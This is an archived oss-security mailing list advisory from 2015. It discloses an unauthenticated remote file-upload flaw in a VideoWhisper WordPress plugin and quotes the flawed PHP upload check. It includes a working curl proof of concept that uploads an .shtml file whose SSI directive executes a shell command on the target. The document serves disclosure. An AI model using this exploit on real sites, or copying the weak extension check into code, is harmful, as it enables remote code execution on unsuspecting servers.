X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3284" "Tuesday" "31" "March" "2015" "21:54:27" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<97A81225-70EB-4630-BA8D-8BC3F252CD35@me.com>" "89" "[oss-security] Remote file upload vulnerability in videowhisper-video-conference-integration wordpress plugin v4.91.8" nil nil nil "3" "2015040101:54:27" "[oss-security] Remote file upload vulnerability in videowhisper-video-conference-integration wordpress plugin v4.91.8" (number mark "        larry0@me.co Mar 31   89/3284  " thread-indent "\"[oss-security] Remote file upload vulnerability in videowhisper-video-conference-integration wordpress plugin v4.91.8\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 30574 invoked by uid 550); 1 Apr 2015 01:55:16 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 30490 invoked from network); 1 Apr 2015 01:55:09 -0000
X-Proofpoint-Virus-Version: vendor=fsecure
 engine=2.50.10432:5.13.68,1.0.33,0.0.0000
 definitions=2015-03-31_06:2015-03-31,2015-03-31,1970-01-01 signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 suspectscore=0 phishscore=0 adultscore=0 bulkscore=0 classifier=spam adjust=0
 reason=mlx scancount=1 engine=7.0.1-1412110000 definitions=main-1504010017
Content-type: text/plain; charset=utf-8
Content-transfer-encoding: quoted-printable
Message-id: <97A81225-70EB-4630-BA8D-8BC3F252CD35@me.com>
MIME-version: 1.0 (Mac OS X Mail 8.2 \(2070.6\))
X-Mailer: Apple Mail (2.2070.6)
Date: Tue, 31 Mar 2015 21:54:27 -0400
From: "Larry W. Cashdollar" <larry0@me.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Remote file upload vulnerability in
 videowhisper-video-conference-integration wordpress plugin v4.91.8
To: Open Source Security <oss-security@lists.openwall.com>

Title: Remote file upload vulnerability in videowhisper-video-conference-in=
tegration wordpress plugin v4.91.8
Author: Larry W. Cashdollar, @_larry0
Date: 2015-03-29
Download Site: https://wordpress.org/support/plugin/videowhisper-video-conf=
erence-integration
Vendor: http://www.videowhisper.com/
Vendor Notified: 2015-03-31, won=E2=80=99t fix. http://www.videowhisper.com=
/tickets_view.php?t=3D10019545-1427810822
Vendor Contact: http://www.videowhisper.com/tickets_submit.php
Advisory: http://www.vapid.dhs.org/advisory.php?v=3D116
Description: From their site "VideoWhisper Video Conference is a modern web=
 based multiple way video chat and real time file sharing tool.  Read more =
on WordPress Video Conference plugin home page."

Vulnerability:
./videowhisper-video-conference-integration/vc/vw_upload.php Allows various=
 remote unauthenticated file uploads, among the file types is html where th=
e last 4 characters are only being checked in a file name to match which ty=
pes are allowed. Because of this .shtml can be passed through and remote co=
de execution is SSI is allowed. The code does not do any user access valida=
tion and therefore anyone can upload the following files to an unsuspecting=
 wordpress site:=20

.shtml,swf,.zip,.rar,.jpg,jpeg,.png,.gif,.txt,.doc,docx,.htm,html,.pdf,.mp3=
,.flv,.avi,.mpg,.ppt,.pps The
if (strstr($filename,'.php')) exit;
can be by passed by using the extension .Php but the file extension check w=
ould allow files like test.Php.shtml

./videowhisper-video-conference-integration/vc/vw_upload.php

<?php=20
if ($_GET["room"]) $room=3D$_GET["room"];=20
if ($_POST["room"]) $room=3D$_POST["room"];=20

$filename=3D$_FILES['vw_file']['name=E2=80=99];
include_once("incsan.php");=20
sanV($room);
if (!$room) exit;=20
sanV($filename);=20
if (!$filename) exit;=20
if (strstr($filename,'.php')) exit; //do not allow uploads to other folders
if ( strstr($room,"/") || strstr($room,"..") ) exit;=20
if ( strstr($filename,"/") || strstr($filename,"..") ) exit;=20
$destination=3D"uploads/".$room."/=E2=80=9C;=20
if ($_GET["slides"]) $destination .=3D "slides/=E2=80=9C;
$ext=3Dstrtolower(substr($filename,-4)); $allowed=3Darray(".swf",".zip",".r=
ar",".jpg","jpeg",".png",".gif",".txt",".doc","docx",".htm","html",".pdf","=
.mp3",".flv",".avi",".mpg",".ppt",".pps=E2=80=9D);
if (in_array($ext,$allowed)) move_uploaded_file($_FILES['vw_file']['tmp_nam=
e'], $destination . $filename);
?>loadstatus=3D1

CVEID: TBD
OSVDB: TBD

Exploit Code:
	 videowhisp_poc.php=20

	 <?php
=09=20=20
	 $uploadfile=3D"upexp.shtml";
	 $ch =3D=20
	 curl_init("http://target_site/wp-content/plugins/videowhisper-video-confe=
rence-integration/vc/vw_upload.php");
       curl_setopt($ch, CURLOPT_POST, true);
	  curl_setopt($ch, CURLOPT_POSTFIELDS,
	           array('vw_file'=3D>"@$uploadfile",'name'=3D>'upexp.shtml','room=
'=3D>'.'));
	 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	 $postResult =3D curl_exec($ch);
	 curl_close($ch);
	 print "$postResult";
=09=20=20
	 ?>
=09=20=20
	 upexp.shtml
=09=20=20
	 <html>
=09=20=20
	 <!--#exec cmd=3D"/usr/bin/date > /tmp/p" -->
=09=20=20
	 this is html
	 </html>
=09=20=20
=09=20=20
	 The executeable should be located in wordpress/wp-content/plugins/videowh=
isper-video-conference-integration/vc/uploads=
